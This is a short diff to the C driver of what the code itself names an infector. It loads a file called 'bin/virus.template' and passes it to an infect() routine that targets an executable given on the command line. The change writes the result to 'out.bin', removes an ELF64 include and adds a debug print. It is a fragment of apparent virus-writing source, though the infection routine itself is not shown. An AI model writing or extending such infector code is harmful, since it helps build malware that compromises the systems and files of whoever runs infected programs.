@@ -1,6 +1,5 @@
 #define INFECTOR
 #include "lib/lib.c"
-#include "lib/elf64.c"
 #include "lib/infect.c"
 
 int usage(char *name){
@@ -38,6 +37,7 @@ int main(int ac, char **av){
 	}
 	char *template; size_t n;
 	fget("bin/virus.template", &template, &n);
-	infect(av[1], template, n);
+	infect(av[1], "out.bin", template, n);
+	printnb(12222);
 	return 0;
 }
